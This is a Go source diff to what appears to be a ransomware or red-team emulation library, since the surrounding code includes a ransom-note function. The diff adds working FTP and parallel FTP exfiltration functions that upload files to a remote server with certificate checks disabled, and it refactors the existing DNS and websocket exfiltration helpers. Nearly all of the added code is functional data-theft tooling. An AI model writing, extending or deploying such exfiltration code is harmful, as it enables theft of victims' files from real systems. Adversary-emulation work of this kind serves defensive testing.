@@ -15,10 +15,13 @@ import (
 	"io"
 	"net"
 	"os"
+	"path/filepath"
+	"strings"
 	"sync"
 	"time"
 
 	ws "github.com/gorilla/websocket"
+	"github.com/mjwhitta/ftp"
 )
 
 // DefaultEncrypt is the default encryption behavior.
@@ -104,8 +107,8 @@ func Base64Encode(path string, b []byte) ([]byte, error) {
 // DNSResolvedExfil will return a function pointer to an ExfilFunc
 // that exfils by sending DNS queries to the authoritative nameserver
 // for the specified domain.
-func DNSResolvedExfil(domain string) ExfilFunc {
-	return func(path string, b []byte) error {
+func DNSResolvedExfil(domain string) (ExfilFunc, error) {
+	var f ExfilFunc = func(path string, b []byte) error {
 		var b64 string
 		var data []byte = append([]byte(path+" "), b...)
 		var done bool
@@ -184,6 +187,127 @@ func DNSResolvedExfil(domain string) ExfilFunc {
 
 		return nil
 	}
+
+	return f, nil
+}
+
+// FTPExfil will return a function pointer to an ExfilFunc that
+// exfils via an FTP connection.
+func FTPExfil(dst, user, passwd string) (ExfilFunc, error) {
+	var c *ftp.ServerConn
+	var e error
+	var f ExfilFunc
+	var m *sync.Mutex = &sync.Mutex{}
+	var secure bool
+
+	// Remove leading protocol
+	if strings.HasPrefix(dst, "ftp://") {
+		dst = strings.Replace(dst, "ftp://", "", 1)
+	} else if strings.HasPrefix(dst, "ftps://") {
+		dst = strings.Replace(dst, "ftps://", "", 1)
+		secure = true
+	}
+
+	// Connect to FTP server
+	if !secure {
+		c, e = ftp.Dial(dst, ftp.DialWithTimeout(5*time.Second))
+	} else {
+		// Skip verify in case user is using self-signed cert
+		c, e = ftp.Dial(
+			dst,
+			ftp.DialWithTimeout(5*time.Second),
+			ftp.DialWithExplicitTLS(
+				&tls.Config{InsecureSkipVerify: true},
+			),
+		)
+	}
+	if e != nil {
+		return nil, e
+	}
+
+	// Authenticate
+	if e = c.Login(user, passwd); e != nil {
+		return nil, e
+	}
+
+	f = func(path string, b []byte) error {
+		if strings.HasPrefix(path, "/") {
+			path = strings.Replace(path, "/", "", 1)
+		}
+
+		m.Lock()
+		defer m.Unlock()
+
+		// Make dirs
+		c.MakeDirRecur(filepath.Dir(path))
+
+		// Upload file
+		path = strings.Join(
+			strings.Split(path, string(filepath.Separator)),
+			"/",
+		)
+		return c.Stor(path, bytes.NewReader(b))
+	}
+
+	return f, nil
+}
+
+// FTPParallelExfil will return a function pointer to an ExfilFunc
+// that exfils via multiple FTP connections.
+func FTPParallelExfil(dst, user, passwd string) (ExfilFunc, error) {
+	var f ExfilFunc
+	var secure bool
+
+	// Remove leading protocol
+	if strings.HasPrefix(dst, "ftp://") {
+		dst = strings.Replace(dst, "ftp://", "", 1)
+	} else if strings.HasPrefix(dst, "ftps://") {
+		dst = strings.Replace(dst, "ftps://", "", 1)
+		secure = true
+	}
+
+	f = func(path string, b []byte) error {
+		var c *ftp.ServerConn
+		var e error
+
+		if strings.HasPrefix(path, "/") {
+			path = strings.Replace(path, "/", "", 1)
+		}
+
+		// Connect to FTP server
+		if !secure {
+			c, e = ftp.Dial(dst, ftp.DialWithTimeout(5*time.Second))
+		} else {
+			// Skip verify in case user is using self-signed cert
+			c, e = ftp.Dial(
+				dst,
+				ftp.DialWithTimeout(5*time.Second),
+				ftp.DialWithExplicitTLS(
+					&tls.Config{InsecureSkipVerify: true},
+				),
+			)
+		}
+		if e != nil {
+			return e
+		}
+
+		// Authenticate
+		if e = c.Login(user, passwd); e != nil {
+			return e
+		}
+
+		// Make dirs
+		c.MakeDirRecur(filepath.Dir(path))
+
+		// Upload file
+		path = strings.Join(
+			strings.Split(path, string(filepath.Separator)),
+			"/",
+		)
+		return c.Stor(path, bytes.NewReader(b))
+	}
+
+	return f, nil
 }
 
 // RansomNote will return a function pointer to a NotifyFunc that
@@ -324,12 +448,14 @@ func wait(t time.Time, waitEvery, waitFor time.Duration) time.Time {
 
 // WebsocketExfil will return a function pointer to an ExfilFunc that
 // exfils via a websocket connection.
-func WebsocketExfil(dst string) ExfilFunc {
+func WebsocketExfil(dst string) (ExfilFunc, error) {
 	var c *ws.Conn
 	var dialer ws.Dialer
 	var e error
-	var m = &sync.Mutex{}
+	var f ExfilFunc
+	var m *sync.Mutex = &sync.Mutex{}
 
+	// Connect to Websocket
 	dialer = ws.Dialer{
 		// Skip verify in case user is using self-signed cert
 		TLSClientConfig: &tls.Config{
@@ -337,12 +463,10 @@ func WebsocketExfil(dst string) ExfilFunc {
 		},
 	}
 	if c, _, e = dialer.Dial(dst, nil); e != nil {
-		return func(path string, b []byte) error {
-			return e
-		}
+		return nil, e
 	}
 
-	return func(path string, b []byte) error {
+	f = func(path string, b []byte) error {
 		var b64 []byte = []byte(base64.StdEncoding.EncodeToString(b))
 		var data []byte = append([]byte(path+" "), b64...)
 		var e error
@@ -353,19 +477,20 @@ func WebsocketExfil(dst string) ExfilFunc {
 
 		return e
 	}
+
+	return f, nil
 }
 
 // WebsocketParallelExfil will return a function pointer to an
 // ExfilFunc that exfils via multiple websocket connections.
-func WebsocketParallelExfil(dst string) ExfilFunc {
+func WebsocketParallelExfil(dst string) (ExfilFunc, error) {
 	var dialer = ws.Dialer{
 		// Skip verify in case user is using self-signed cert
 		TLSClientConfig: &tls.Config{
 			InsecureSkipVerify: true,
 		},
 	}
-
-	return func(path string, b []byte) error {
+	var f ExfilFunc = func(path string, b []byte) error {
 		var b64 []byte = []byte(base64.StdEncoding.EncodeToString(b))
 		var c *ws.Conn
 		var data []byte = append([]byte(path+" "), b64...)
@@ -384,4 +509,6 @@ func WebsocketParallelExfil(dst string) ExfilFunc {
 
 		return c.WriteMessage(ws.TextMessage, data)
 	}
+
+	return f, nil
 }
